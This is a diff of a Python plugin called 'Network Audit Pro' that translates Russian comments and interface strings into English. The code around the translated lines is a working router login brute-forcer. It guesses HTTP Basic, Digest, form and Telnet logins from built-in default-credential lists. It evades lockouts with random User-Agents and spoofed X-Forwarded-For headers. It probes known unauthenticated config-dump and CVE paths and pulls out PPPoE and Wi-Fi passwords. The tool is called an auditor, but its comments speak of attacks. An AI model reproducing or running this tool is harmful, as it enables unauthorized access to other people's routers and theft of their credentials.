@@ -2,7 +2,7 @@ __id__ = "net_audit_pro"
 __name__ = "Network Audit Pro"
 __version__ = "1.6.1"
 __author__ = "Pinaplast"
-__description__ = "Аудитор домашних роутеров: доступ к панели (Basic/Digest/форма), Telnet и UPnP-замеры, поиск утечек конфигов, отчёты и журнал событий. Плагин рабочий, но требует тестов на разных роутерах. Если будут баги или ошибки, просьба скидывать их мне в ТГ: @Pinaplast457"
+__description__ = "Home router auditor: admin panel access (Basic/Digest/form), Telnet and UPnP checks, config leak discovery, reports and an event log. The plugin works but needs testing on different routers. If you find bugs or errors, please send them to me on Telegram: @Pinaplast457"
 __icon__ = "rounded:lock_open"
 __library__ = False
 __design_library__ = False
@@ -30,8 +30,8 @@ import ssl
 
 
 def _tls_context():
-    # роутерный TLS почти всегда самоподписной: строгая проверка цепочки
-    # убивает подключение, поэтому проверку отключаем осознанно
+    # router TLS is almost always self-signed: strict chain validation
+    # would kill the connection, so verification is disabled deliberately
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
@@ -517,7 +517,7 @@ admin admin1
 Admin admin
 ADMIN admin
 admin rfhfif
-admin пароль
+admin password
 admin parol
 admin parol123
 admin asdf123
@@ -527,7 +527,7 @@ admin NAPOLEON
 
 AUTH_MODE_LABELS = {"basic": "Basic Auth", "digest": "Digest Auth"}
 
-# компактный телнет-словарь: заводские пары + самые частые из большого словаря
+# compact Telnet wordlist: factory pairs + the most common entries from the big list
 TELNET_CREDS = [
     ("admin", "admin"), ("admin", "admin123"), ("admin", ""), ("admin", "password"),
     ("admin", "1234"), ("admin", "12345"), ("root", "root"), ("root", "admin"),
@@ -542,7 +542,7 @@ TELNET_FAIL_MARKERS = ("incorrect", "invalid", "wrong", "denied", "failed", "bad
 
 
 def strip_telnet_iacs(data):
-    # выкидываем управляющие последовательности telnet (IAC, WILL/WONT/DO/DONT/SB..SE)
+    # strip telnet control sequences (IAC, WILL/WONT/DO/DONT/SB..SE)
     out = bytearray()
     i = 0
     n = len(data)
@@ -566,7 +566,7 @@ def strip_telnet_iacs(data):
 
 
 def classify_telnet_reply(text):
-    # вердикт по тому, что роутер напечатал после ввода пароля
+    # verdict based on what the router printed after the password was entered
     low = str(text or "").lower()
     if any(m in low for m in TELNET_FAIL_MARKERS):
         return "fail"
@@ -580,7 +580,7 @@ def classify_telnet_reply(text):
 def extract_pppoe_credentials(xml_text):
     user = re.search(r'(?:pppoe[_-]?user(?:name)?|wan[_-]?user(?:name)?)\b[^<>]*>?\s*:?\s*"?(?:<|&lt;)?([^"<>\r\n&]+)', xml_text, re.IGNORECASE)
     passw = re.search(r'(?:pppoe[_-]?pass(?:word)?|wan[_-]?pass(?:word)?)\b[^<>]*>?\s*:?\s*"?(?:<|&lt;)?([^"<>\r\n&]+)', xml_text, re.IGNORECASE)
-    # запасной вариант: типичные теги пароля
+    # fallback: typical password tags
     if not passw:
         passw = re.search(r'(?:admin[_-]?pass(?:word)?|newpass(?:word)?)\b[^<>]*>?\s*:?\s*"?(?:<|&lt;)?([^"<>\r\n&]+)', xml_text, re.IGNORECASE)
     user_val = user.group(1).strip() if user else ""
@@ -589,14 +589,14 @@ def extract_pppoe_credentials(xml_text):
 
 
 def decode_chunked_body(raw):
-    # HTTP/1.1 chunked: снимаем маркеры размеров (1f2e\r\n...),
-    # оставляя чистое тело; на сбое возвращаем вход как есть
+    # HTTP/1.1 chunked: strip the size markers (1f2e\r\n...),
+    # leaving a clean body; on failure the input is returned as is
     out = bytearray()
     i = 0
     while True:
         j = raw.find(b"\r\n", i)
         if j < 0:
-            # маркеров нет: если и чанков не распознали — это просто тело, отдаём как есть
+            # no markers: if no chunks were recognized either, it is just a body — return it as is
             return bytes(out) if out else bytes(raw)
         size_hdr = raw[i:j].split(b";")[0].strip()
         try:
@@ -606,12 +606,12 @@ def decode_chunked_body(raw):
         if size == 0:
             break
         out += raw[j + 2: j + 2 + size]
-        i = j + 2 + size + 2  # перепрыгиваем CRLF после чанка
+        i = j + 2 + size + 2  # skip the CRLF after the chunk
     return bytes(out)
 
 
 def decode_rom0_secrets(body_bytes):
-    # rom-0 несёт сжатые zlib-секции внутри бинарного дампа
+    # rom-0 carries zlib-compressed sections inside the binary dump
     secrets = []
     if not body_bytes:
         return secrets
@@ -631,26 +631,26 @@ def decode_rom0_secrets(body_bytes):
 
 
 KNOWN_ROUTES = [
-    ("/rom-0", "Дамп конфигурации без пароля (классика Zyxel), содержит PPPoE и Wi-Fi пароли"),
-    ("/HNAP1/", "SOAP-интерфейс HNAP у D-Link: известны обходы авторизации и RCE (CVE-2013-7381, CVE-2018-6530)"),
-    ("/goform/goform_get_cmd_process?isTest=false&cmd=WAN_STAT", "Статистика WAN через ZTE goform иногда отдаётся без сессии"),
-    ("/getpage.gch?pid=1002&nextpage=Gpon_epoinfo_t.gch", "ZTE F460/F660 GPON: страница с PPPoE-логином/паролем провайдера без авторизации"),
-    ("/GponForm/diag_Form?images/", "GPON диагностическая форма, известна обходом входа (CVE-2018-10561) и RCE"),
-    ("/cgi-bin/status_cgi", "DD-WRT страница статуса: таблицы DHCP и WAN часто видны без логина"),
-    ("/backup_settings_2.xml", "Бэкап настроек, внутри сохранённые пароли"),
-    ("/boaform/admin/formLogin", "BOA webserver (Realtek/ZTE-платы): формы админки отвечают даже пустой сессии"),
-    ("/SystemInfo.html", "Инфо о прошивке без входа (различные китайские прошивки)"),
+    ("/rom-0", "Unauthenticated config dump (a Zyxel classic), contains PPPoE and Wi-Fi passwords"),
+    ("/HNAP1/", "D-Link HNAP SOAP interface: known auth bypasses and RCE (CVE-2013-7381, CVE-2018-6530)"),
+    ("/goform/goform_get_cmd_process?isTest=false&cmd=WAN_STAT", "WAN stats via ZTE goform are sometimes served without a session"),
+    ("/getpage.gch?pid=1002&nextpage=Gpon_epoinfo_t.gch", "ZTE F460/F660 GPON: page with the provider PPPoE login/password, no auth required"),
+    ("/GponForm/diag_Form?images/", "GPON diagnostic form, known for login bypass (CVE-2018-10561) and RCE"),
+    ("/cgi-bin/status_cgi", "DD-WRT status page: DHCP and WAN tables are often visible without login"),
+    ("/backup_settings_2.xml", "Settings backup with stored passwords inside"),
+    ("/boaform/admin/formLogin", "BOA webserver (Realtek/ZTE boards): admin forms respond even to an empty session"),
+    ("/SystemInfo.html", "Firmware info without login (various Chinese firmwares)"),
 ]
 
 LOGIN_PASSWORD_INPUT_MARKERS = ['type="password"', "type='password'", "type=password"]
-LOGGED_IN_MARKERS = ("logout", "выйти", "выход", "administration", "reboot", "firmware upgrade", "wps")
+LOGGED_IN_MARKERS = ("logout", "sign out", "exit", "administration", "reboot", "firmware upgrade", "wps")
 
 _DEFAULT_PAIRS_CACHE = None
 
 
 def default_dict_pairs():
-    # встроенный словарь статичен: парсим один раз, иначе рендер экрана
-    # перекраивает 380 строк каждые 0.5 с во время атаки
+    # the built-in wordlist is static: parse it once, otherwise screen rendering
+    # re-parses 380 lines every 0.5 s during an attack
     global _DEFAULT_PAIRS_CACHE
     if _DEFAULT_PAIRS_CACHE is None:
         _DEFAULT_PAIRS_CACHE = _parse_pairs_static(DEFAULT_DICT_TEXT)
@@ -680,7 +680,7 @@ NETFAIL_PAUSE_S = 30
 
 
 def extract_retry_after(full_text):
-    # пауза, которую роутер требует в заголовке Retry-After; потолок 120 сек
+    # pause the router demands via the Retry-After header; capped at 120 s
     m = re.search(r"(?im)^retry-after:\s*([0-9]+)", full_text or "")
     if not m:
         return 0
@@ -718,7 +718,7 @@ def generate_basic_token(username, password):
 
 
 def parse_digest_challenge(header_value):
-    # принимает и полную строку WWW-Authenticate, и только значение после неё
+    # accepts both a full WWW-Authenticate line and just the value after it
     body = str(header_value or "").split(":", 1)[-1]
     params = {}
     if "digest" not in body.lower():
@@ -762,7 +762,7 @@ def build_digest_header(params, username, password, method, path, nc="00000001",
 
 def build_form_body(username, password, fields=None):
     if fields and fields[1]:
-        # page-поля точнее любого справочника: шлём ровно то, что просит роутер
+        # page fields beat any reference list: send exactly what the router asks for
         user_f, pass_f, hidden = fields
         pairs = list(hidden)
         if user_f:
@@ -782,13 +782,13 @@ def build_form_body(username, password, fields=None):
         ("login_password", password),
         ("admin_password", password),
     ]
-    # urlencode обязателен: символы =,&,+ и пробел в пароле иначе ломают разбор тела
+    # urlencode is mandatory: otherwise =,&,+ and spaces in the password break body parsing
     return urllib.parse.urlencode(pairs)
 
 
-# имя полей user/pass берём из самой страницы роутера: у каждого бренда свои
-# имена (luci_*, userName, admPasswd...), фиксированный список всегда отстаёт.
-# Скрытые поля (nonce/token) с их value идут в тело как есть
+# user/pass field names come from the router page itself: every brand has its own
+# names (luci_*, userName, admPasswd...); a fixed list is always behind.
+# hidden fields (nonce/token) go into the body with their values as is
 def extract_form_fields(html):
     for block in re.findall(r"<form\b.*?</form>", html or "", re.IGNORECASE | re.DOTALL):
         if not any(m in block.lower() for m in LOGIN_PASSWORD_INPUT_MARKERS):
@@ -817,7 +817,7 @@ class NetAuditPro(BasePlugin):
     def on_plugin_load(self):
         self.add_module(
             title="Network Audit Pro",
-            description="Аудит сетевых устройств: доступ к панели управления (Basic/Digest/форма), Telnet и UPnP-замеры, утечки конфигов, отчёты и журнал событий. Плагин рабочий, но требует тестов на разных роутерах. Если будут баги или ошибки, просьба скидывать их мне в ТГ: @Pinaplast457",
+            description="Network device audit: admin panel access (Basic/Digest/form), Telnet and UPnP checks, config leaks, reports and an event log. The plugin works but needs testing on different routers. If you find bugs or errors, please send them to me on Telegram: @Pinaplast457",
             icon="lock_open",
             screen="main",
             section="PLUGINS"
@@ -859,8 +859,8 @@ class NetAuditPro(BasePlugin):
         self.digest_params = None
         self._form_fields = None
 
-        self.ping_status_text = "Нажмите «Пинг», чтобы опросить роутер."
-        self.scan_results_txt = "Сканер портов покажет результат здесь."
+        self.ping_status_text = "Press \"Ping\" to probe the router."
+        self.scan_results_txt = "The port scanner will show results here."
         self.generated_report_text = ""
         self._brute_started_ts = 0.0
         self.last_run_summary = None
@@ -882,7 +882,7 @@ class NetAuditPro(BasePlugin):
         self.lockout_pause_s = self._safe_int(self.get_setting("lockout_pause_s", 10), 10, 0, 600)
         self.manual_dict_path = str(self.get_setting("manual_dict_path", ""))
 
-        self.status_line = "Ожидание запуска. Проверьте шлюз и порт."
+        self.status_line = "Waiting to start. Check the gateway and port."
         self._cached_ip = ""
         self._cached_ip_time = 0.0
         self._cached_vpn = None
@@ -935,14 +935,14 @@ class NetAuditPro(BasePlugin):
     def _parse_dict_pairs(self, text):
         return _parse_pairs_static(text)
 
-    # ------------------- Выбор файла словаря -------------------
+    # ------------------- Dictionary file selection -------------------
 
     DICT_DIRS = ["/sdcard", "/sdcard/Download", "/sdcard/Documents"]
     DICT_WALK_DEPTH = 2
 
     def _scan_dict_files(self, max_results=24):
         cached = self._dict_scan_cache
-        # ttl-кэш: os.walk по всей памяти не должен случаться на каждом рендере
+        # ttl cache: os.walk over the whole storage must not run on every render
         if cached and cached[0] >= max_results and (time.time() - cached[1]) < 10.0:
             return list(cached[2][:max_results])
         found = {}
@@ -978,7 +978,7 @@ class NetAuditPro(BasePlugin):
     def _read_text_file(self, path, byte_limit=1048576):
         size = os.path.getsize(path)
         if size > byte_limit:
-            self.toast("⚠️ Файл больше 1 МБ, читаю первые 1 МБ")
+            self.toast("⚠️ File is larger than 1 MB, reading the first 1 MB")
         with open(path, "r", encoding="utf-8", errors="replace") as f:
             return f.read(byte_limit)
 
@@ -990,24 +990,24 @@ class NetAuditPro(BasePlugin):
             if names:
                 picked = names[0][0]
         if not picked:
-            self.toast("❌ Укажите путь к файлу или выберите из списка")
+            self.toast("❌ Specify a file path or pick one from the list")
             return False
         looks_uri = picked.startswith("content:") or picked.startswith("file:")
         if not looks_uri and not os.path.exists(picked) and not picked.lower().endswith(".txt"):
-            # пробуем дописать расширение, но только если голый путь не существует
+            # try appending the extension, but only if the bare path does not exist
             candidate = picked + ".txt"
             if os.path.exists(candidate):
                 picked = candidate
         if not looks_uri and not os.path.exists(picked):
-            self._log("Файл словаря не найден: {}".format(picked), "ERR")
-            self.toast("❌ Файл не найден: {}".format(os.path.basename(picked) if picked else "-"))
+            self._log("Dictionary file not found: {}".format(picked), "ERR")
+            self.toast("❌ File not found: {}".format(os.path.basename(picked) if picked else "-"))
             self.refresh()
             return False
         try:
             content = self._read_text_file(picked)
         except Exception as exc:
-            self._log("Не удалось прочитать {}: {}".format(picked, exc), "ERR")
-            self.toast("❌ Файл не читается")
+            self._log("Failed to read {}: {}".format(picked, exc), "ERR")
+            self.toast("❌ File is unreadable")
             self.refresh()
             return False
         pairs = self._parse_dict_pairs(content)
@@ -1017,8 +1017,8 @@ class NetAuditPro(BasePlugin):
         self.manual_dict_path = picked
         self.set_setting("manual_dict_path", picked)
         shown_size = str(os.path.getsize(picked)).replace(",", " ")
-        self._log("Словарь из {}: {} пар ({} байт)".format(picked, len(pairs), shown_size), "DICT")
-        self.toast("✅ Загружено {} пар из {}".format(len(pairs), os.path.basename(picked)))
+        self._log("Dictionary from {}: {} pairs ({} bytes)".format(picked, len(pairs), shown_size), "DICT")
+        self.toast("✅ Loaded {} pairs from {}".format(len(pairs), os.path.basename(picked)))
         self.refresh()
         return True
 
@@ -1026,10 +1026,10 @@ class NetAuditPro(BasePlugin):
         self.custom_dict_text = ""
         self._imported_pairs_count = 0
         self.set_setting("custom_dict_text", "")
-        self._log("Свой словарь очищен", "DICT")
+        self._log("Custom dictionary cleared", "DICT")
         self.refresh()
 
-    # ------------------- Кандидаты -------------------
+    # ------------------- Candidates -------------------
 
     def _build_candidates(self):
         seen = set()
@@ -1058,7 +1058,7 @@ class NetAuditPro(BasePlugin):
             for u, p in limited:
                 push(u, p)
             if len(imported) > 10000:
-                self._log("Свой словарь усечён до 10000 пар", "WARN")
+                self._log("Custom dictionary truncated to 10000 pairs", "WARN")
 
         if self.mode != "form":
             for u, p in GENERIC_CREDS:
@@ -1078,7 +1078,7 @@ class NetAuditPro(BasePlugin):
 
         return result
 
-    # ------------------- Разведка и детекты -------------------
+    # ------------------- Recon and detection -------------------
 
     def detect_brand_from_page(self, title, server_header, body_lower):
         combined = "{} {} {}".format(title, server_header, body_lower).lower()
@@ -1115,7 +1115,7 @@ class NetAuditPro(BasePlugin):
         www = self.extract_www_authenticate(response)
         if not www:
             return ""
-        # снимаем кавычки с обеих сторон и берём именно значение realm=
+        # strip the quotes on both sides and take the realm= value itself
         m = re.search(r'realm\s*=\s*"([^"]*)"', www)
         if m:
             return m.group(1)
@@ -1137,14 +1137,14 @@ class NetAuditPro(BasePlugin):
         if action.lower().startswith("http"):
             slash_idx = action.find("/", action.find("//") + 2)
             action = action[slash_idx:] if slash_idx >= 0 else "/"
-        # убираем любые пробельные символы/переводы строк — они разрывают request line
+        # strip any whitespace/newlines — they break the request line
         action = "".join(action.split())
         if action and not action.startswith("/"):
             action = "/" + action
         return action
 
     def find_form_action(self, html):
-        # предпочитаем форму с password-полем: первая форма на странице бывает поиск/логаут
+        # prefer the form with a password field: the first form on a page may be search/logout
         blocks = re.findall(r"<form\b.*?</form>", html, re.IGNORECASE | re.DOTALL)
         fallback = ""
         for block in blocks:
@@ -1169,7 +1169,7 @@ class NetAuditPro(BasePlugin):
         low = realm.lower()
         for key in sorted(CREDS_BY_REALM.keys(), key=len, reverse=True):
             if key in low:
-                self._log("Realm '{}': применяю дефолты категории '{}' первыми".format(realm, key), "SCAN")
+                self._log("Realm '{}': applying category '{}' defaults first".format(realm, key), "SCAN")
                 return CREDS_BY_REALM[key]
         return []
 
@@ -1204,14 +1204,14 @@ class NetAuditPro(BasePlugin):
             except Exception:
                 ip = None
         if ip and ip != getattr(self, "_last_seen_ip", ""):
-            # сменилась сеть — прошлый SSID протух, сбрасываем только если
-            # API в этом вызове не дал свежего SSID
+            # the network changed — the old SSID is stale; reset it only if
+            # the API did not provide a fresh SSID in this call
             if not ssid_from_api:
                 self._device_ssid = ""
         self._last_seen_ip = ip or ""
         if ip:
             if ip.startswith("198.18."):
-                ssid = "VPN Fake-IP (не Wi-Fi)"
+                ssid = "VPN Fake-IP (not Wi-Fi)"
                 is_wifi = False
             elif ip.startswith("192.168."):
                 is_wifi = True
@@ -1219,13 +1219,13 @@ class NetAuditPro(BasePlugin):
                     ssid = "Wi-Fi (LAN)"
             elif ip.startswith("100.") or (ip.startswith("10.") and not is_wifi):
                 if not ssid:
-                    ssid = "Мобильная сеть / VPN"
+                    ssid = "Mobile network / VPN"
             else:
                 if not ssid:
-                    ssid = "Подключено (Wi-Fi/LAN)"
+                    ssid = "Connected (Wi-Fi/LAN)"
                     is_wifi = True
         else:
-            ssid = "Wi-Fi не подключён"
+            ssid = "Wi-Fi not connected"
         return ssid, ip or "—", is_wifi
 
     def _detect_vpn(self):
@@ -1239,7 +1239,7 @@ class NetAuditPro(BasePlugin):
         self._cached_vpn_time = now
         return vpn_active
 
-    # ------------------- HTTP ядро с обходом детекта -------------------
+    # ------------------- HTTP core with detection evasion -------------------
 
     def http_request(self, host, port, method, path, body=None, auth_token=None, timeout=4.0, evade=True):
         user_agent = generate_random_user_agent() if (evade and self.evasion_ua) else "Mozilla/5.0"
@@ -1253,7 +1253,7 @@ class NetAuditPro(BasePlugin):
             fake_ip = "192.168.{}.{}".format(random.randint(0, 255), random.randint(2, 254))
             headers.append("X-Forwarded-For: {}".format(fake_ip))
         if auth_token:
-            # base64-токен без пробелов => Basic; значение со схемой (Digest ...) проходит как есть
+            # a base64 token without spaces => Basic; a value with a scheme (Digest ...) passes as is
             if " " in str(auth_token):
                 headers.append("Authorization: {}".format(auth_token))
             else:
@@ -1274,8 +1274,8 @@ class NetAuditPro(BasePlugin):
                 sock = _tls_context().wrap_socket(sock, server_hostname=host)
             sock.sendall(payload)
             response = b""
-            # общий дедлайн на весь приём: медленный/хитрый сервер не должен
-            # растягивать одну попытку на несколько таймаутов подряд
+            # one overall deadline for the whole receive: a slow/tricky server must not
+            # stretch a single attempt into several consecutive timeouts
             deadline = time.time() + timeout
             while len(response) < 65536:
                 remaining = deadline - time.time()
@@ -1293,7 +1293,7 @@ class NetAuditPro(BasePlugin):
                 bsep = response.find(b"\r\n\r\n")
                 if bsep >= 0:
                     response = response[:bsep + 4] + decode_chunked_body(response[bsep + 4:])
-            # latin-1 обратимо кодируется назад в байты — нужно для парсинга rom-0
+            # latin-1 maps back to bytes losslessly — needed for rom-0 parsing
             text = response.decode("latin-1", errors="replace")
             head_line = text.split("\n", 1)[0].strip()
             try:
@@ -1346,7 +1346,7 @@ class NetAuditPro(BasePlugin):
                 else:
                     should_log = False
             if should_log:
-                self._log("🥷 Роутер начал блокировать (серия 403/429). Пауза {} сек, потом продолжаю".format(
+                self._log("🥷 The router started blocking (a run of 403/429). Pausing {} s, then continuing".format(
                     self.lockout_pause_s
                 ), "EVADE")
 
@@ -1355,15 +1355,15 @@ class NetAuditPro(BasePlugin):
             self._consec_lockouts = 0
 
     def _apply_retry_after(self, full_text):
-        # заголовок Retry-After: роутер сам говорит паузу — нельзя долбить дальше
+        # Retry-After header: the router itself asks for a pause — do not keep hammering
         ra = extract_retry_after(full_text)
         if ra > 0:
             with self.stats_lock:
                 self._cooldown_until = max(self._cooldown_until, time.time() + ra)
-            self._log("Роутер просит паузу (Retry-After: {} сек) — соблюдаю".format(ra), "EVADE")
+            self._log("The router asks for a pause (Retry-After: {} s) — honoring it".format(ra), "EVADE")
 
     def _register_netfail_signal(self):
-        # серия полных сетевых сбоев: роутер/файрвол начал дропать наши пакеты
+        # a run of full network failures: the router/firewall started dropping our packets
         with self.stats_lock:
             self._consec_netfail += 1
             streak = self._consec_netfail
@@ -1372,7 +1372,7 @@ class NetAuditPro(BasePlugin):
                 self._consec_netfail = 0
                 self._cooldown_until = max(self._cooldown_until, time.time() + NETFAIL_PAUSE_S)
                 self.evade_pauses += 1
-            self._log("🛑 {} попыток без ответа подряд — похоже, роутер отрезал нас (IP-бан). Пауза {} сек".format(
+            self._log("🛑 {} attempts with no reply in a row — the router likely cut us off (IP ban). Pausing {} s".format(
                 NETFAIL_THRESHOLD, NETFAIL_PAUSE_S
             ), "EVADE")
 
@@ -1387,21 +1387,21 @@ class NetAuditPro(BasePlugin):
         return has_password_input and not logged_in_marker_present
 
     def _normalize_page_sample(self, text):
-        # нормализуем страницу: убираем цифры (nonce/счётчики) и пробелы
+        # normalize the page: strip digits (nonces/counters) and whitespace
         return re.sub(r"\s+", " ", re.sub(r"[0-9]", "", str(text or ""))).strip()[:400]
 
     def _verify_http_hit(self, host, port, method, path, form_body, auth_value, timeout, body):
-        # двойная проверка: некоторые панели отдают одну и ту же страницу
-        # с кодом 200 НЕСКОЛЬКИМ паролям или даже любому (JS-логин).
-        # Контроль — запрос с ЗАВЕДОМО неверными кредами: если мусорный
-        # пароль получает ту же страницу, найденный хит фейковый.
-        # (Анонимный GET недостаточен: панель может анониму отдавать 401,
-        # а любому непустому паролю — 200.)
+        # double check: some panels serve the same page
+        # with 200 for SEVERAL passwords or even any of them (JS login).
+        # The control is a request with KNOWN-WRONG credentials: if a garbage
+        # password gets the same page, the found hit is fake.
+        # (An anonymous GET is not enough: a panel may serve 401 to anonymous,
+        # and 200 to any non-empty password.)
         text = body or ""
         try:
             if form_body is not None:
-                # форма: контроль должен повторять путь, метод и поля логина —
-                # иначе роутер отличит контроль от перебора
+                # form: the control must repeat the path, method and login fields —
+                # otherwise the router will tell the control apart from the brute force
                 control = build_form_body("__netaudit_probe__", "__definitely_wrong__", getattr(self, "_form_fields", None))
                 c_status, c_loc, _ck, c_body, _full = self.http_request(
                     host, port, "POST", path or "/", control, None, timeout, evade=False
@@ -1415,60 +1415,60 @@ class NetAuditPro(BasePlugin):
         except Exception:
             return True
         if c_status in (401, 403):
-            # честная проверка авторизации: неверный пароль отвергнут, верим хиту
+            # a proper auth check: the wrong password was rejected, trust the hit
             return True
         c_text = c_body or ""
         c_low = c_text.lower()
         rejected_page = (
             self._looks_like_login_page(c_text)
-            or any(m in c_low for m in ("invalid", "неверн", "ошибк", "wrong", "denied", "unauthorized", "failed"))
+            or any(m in c_low for m in ("invalid", "incorrect", "error", "wrong", "denied", "unauthorized", "failed"))
         )
         if self._normalize_page_sample(c_body) == self._normalize_page_sample(text):
-            # любые креды дают одну и ту же страницу — фейк
+            # any credentials return the same page — fake
             return False
         if rejected_page:
-            # неверные creds показали логин/ошибку — настоящий reject, хит настоящий
+            # wrong creds showed a login/error page — a genuine reject, the hit is real
             return True
         c_loc_l = (c_loc or "").lower()
         if 300 <= c_status < 400 and ("login" in c_loc_l or "error" in c_loc_l or "auth" in c_loc_l):
             return True
         if c_status <= 0 or c_status >= 400:
-            # контроль ведёт себя странно (404/5xx/сбой) — выводов не делаем
+            # the control behaves oddly (404/5xx/failure) — draw no conclusions
             return True
-        # на неверные креды сервер дал постороннюю страницу: ведёт себя
-        # так же, как на «хите», — не различает пароли, считаем фейком
+        # for wrong credentials the server returned an unrelated page: it behaves
+        # the same as for the "hit" — it does not tell passwords apart, count it fake
         return False
 
     def judge_response(self, status_code, location, body):
         if status_code == 401:
             return "fail"
         if status_code in (403, 429):
-            # OpenWrt/LuCI отдаёт незалогиненному 403 с формой входа:
-            # это «не вошёл», а не бан — иначе кулдаун-автомат сломается
+            # OpenWrt/LuCI serves 403 with a login form to an unauthenticated user:
+            # that is "not logged in", not a ban — otherwise the cooldown logic breaks
             if self._looks_like_login_page(body or ""):
                 return "fail"
             return "lockout"
         if status_code == 200:
             text = body or ""
             if re.search(r'(?i)http-equiv\s*=\s*["\']?refresh[^>]*url\s*=', text):
-                # страница-автопереход на путь входа — не дашборд
+                # an auto-redirect page to the login path — not a dashboard
                 return "fail"
             if self._looks_like_login_page(text):
                 return "fail"
             compact = text.strip()
             if not compact:
                 return "fail"
-            # пустые и безразметные тела не превращаем в ложный хит:
-            # нужны признаки HTML/JSON либо явный маркер авторизации
+            # do not turn empty, markup-less bodies into a false hit:
+            # HTML/JSON signs or an explicit logged-in marker are required
             strong_markup = ("<" in compact) or ("{" in compact)
             strong_marker = any(m in compact.lower() for m in LOGGED_IN_MARKERS)
             if not (strong_markup or strong_marker):
                 return "fail"
             return "hit"
         if 300 <= status_code < 400:
-            # редирект на смену схемы http→https (nginx бы постоянно отдаёт
-            # 302 на https://host/) — не «доступ получен», а приглашение к TLS.
-            # Смотрим путь без хоста: пустой путь или "/" = служебный редирект.
+            # a redirect switching http→https (nginx would keep serving
+            # 302 to https://host/) — not "access gained", an invitation to TLS.
+            # look at the path without the host: an empty path or "/" is a service redirect.
             raw = location or ""
             path_part = raw
             if "://" in raw:
@@ -1484,7 +1484,7 @@ class NetAuditPro(BasePlugin):
             return "hit"
         return "fail"
 
-    # ------------------- Воркеры -------------------
+    # ------------------- Workers -------------------
 
     def worker_loop(self, worker_id, candidates, attack_mode, form_path):
         host = self.gateway
@@ -1506,8 +1506,8 @@ class NetAuditPro(BasePlugin):
                     break
 
                 with self._cursor_lock:
-                    # проверяем поколение ещё раз ПОД замком: иначе воркер,
-                    # уснувший на таймауте, мог бы украсть пару нового прогона
+                    # check the generation again UNDER the lock: otherwise a worker
+                    # asleep in a timeout could steal a pair of the new run
                     if gen != self._run_gen:
                         break
                     pos = self._cursor
@@ -1525,7 +1525,7 @@ class NetAuditPro(BasePlugin):
                 if attack_mode in ("basic", "auto"):
                     self._jitter_sleep()
                     if self.auth_scheme == "digest":
-                        # Digest: анонимный GET выдаёт свежий nonce, второй запрос подписываем
+                        # Digest: an anonymous GET yields a fresh nonce; sign the second request with it
                         _s0, _loc0, _ck0, _b0, full0 = self.http_request(
                             host, port, "GET", "/", None, None, timeout
                         )
@@ -1537,7 +1537,7 @@ class NetAuditPro(BasePlugin):
                         if params:
                             auth_value = build_digest_header(params, username, password, "GET", "/")
                         else:
-                            # нет nonce — Digest недоступен, пытаемся как Basic
+                            # no nonce — Digest unavailable, try as Basic
                             auth_value = generate_basic_token(username, password)
                     else:
                         auth_value = generate_basic_token(username, password)
@@ -1582,16 +1582,16 @@ class NetAuditPro(BasePlugin):
                 with self.stats_lock:
                     self.tried_count += 1
                     if got_hit:
-                        # поколение проверяем и здесь: воркер старого прогона,
-                        # дошумевший в socket-таймауте, не должен перетереть
-                        # свежие found_creds нового запуска
+                        # check the generation here too: a worker of the old run,
+                        # still noisy in a socket timeout, must not overwrite
+                        # the fresh found_creds of the new run
                         if not self.found_flag and gen == self._run_gen:
                             self.found_creds = (username, password, hit_mode)
                             self.found_flag = True
-                            self._log("Пароль найден! Логин '{}' Пароль '{}' (через {})".format(
-                                username if username else "(пусто)",
-                                password if password else "(пусто)",
-                                AUTH_MODE_LABELS.get(hit_mode, "HTML-форма POST")
+                            self._log("Password found! Login '{}' Password '{}' (via {})".format(
+                                username if username else "(empty)",
+                                password if password else "(empty)",
+                                AUTH_MODE_LABELS.get(hit_mode, "HTML form POST")
                             ), "HIT")
                             if halt_on_found:
                                 self.stop_flag = True
@@ -1601,7 +1601,7 @@ class NetAuditPro(BasePlugin):
                         self.fail_count += 1
 
                 if lockout_seen:
-                    # Retry-After из ответа (429/503) важнее внутренних ритуалов
+                    # Retry-After from the response (429/503) takes priority over internal rituals
                     self._apply_retry_after(try_full_text)
                     self._register_lockout_signal()
                 else:
@@ -1621,18 +1621,18 @@ class NetAuditPro(BasePlugin):
                 if halt_on_found and self.found_flag:
                     break
             except Exception as exc:
-                # воркер не должен умирать молча: подвесили бы весь перебор
+                # a worker must not die silently: it would hang the whole brute force
                 try:
                     with self.stats_lock:
                         self.fail_count += 1
-                    self._log("Воркер {}: ошибка попытки: {}".format(worker_id, exc), "ERR")
+                    self._log("Worker {}: attempt error: {}".format(worker_id, exc), "ERR")
                 except Exception:
                     pass
 
         if worker_id == 0:
             self.brute_done = True
 
-    # ------------------- Телнет и UPnP -------------------
+    # ------------------- Telnet and UPnP -------------------
 
     def _read_telnet_until(self, sock, markers, timeout=3.0):
         buf = bytearray()
@@ -1643,7 +1643,7 @@ class NetAuditPro(BasePlugin):
             try:
                 chunk = sock.recv(1024)
             except socket.timeout:
-                # тишина до общего дедлайна не повод сдаваться сразу
+                # silence before the overall deadline is no reason to give up at once
                 continue
             except Exception:
                 break
@@ -1665,7 +1665,7 @@ class NetAuditPro(BasePlugin):
             pass_buf = self._read_telnet_until(s, TELNET_PASS_MARKERS + TELNET_LOGIN_MARKERS, timeout)
             pass_tail = pass_buf.decode("latin-1", errors="replace").lower()
             if any(m in pass_tail for m in TELNET_LOGIN_MARKERS) and not any(m in pass_tail for m in TELNET_PASS_MARKERS):
-                # снова логин — bad user
+                # login prompt again — bad user
                 return False, banner, "login_reprompt"
             s.sendall(("{}\r\n".format(password)).encode("latin-1", errors="replace"))
             final_buf = self._read_telnet_until(s, ("#", ">", "$", "]"), min(3.0, timeout))
@@ -1684,26 +1684,26 @@ class NetAuditPro(BasePlugin):
         if not host or "." not in host:
             return
         if self.running:
-            # не мешаем активному брутфорсу лишними соединениями
-            self._log("Telnet-пропуск: подбор уже идёт", "SCAN")
+            # do not disturb an active brute force with extra connections
+            self._log("Telnet skip: brute force already running", "SCAN")
             return
         for user, passwd in TELNET_CREDS:
             if self.stop_flag:
                 break
             ok, banner, note = self.telnet_try_login(host, user, passwd, 23, min(3.0, float(self.timeout_seconds)))
             if ok:
-                self._log("🎉 Telnet {}:{}: вход '{}'/'{}' успешен (баннер: {})".format(
+                self._log("🎉 Telnet {}:{}: login '{}'/'{}' succeeded (banner: {})".format(
                     host, 23, user, passwd, (banner or "-")[:40]), "HIT")
                 self.telnet_creds = (user, passwd)
                 self._cross_apply_telnet_creds(user, passwd)
                 return
             if note == "conn_error":
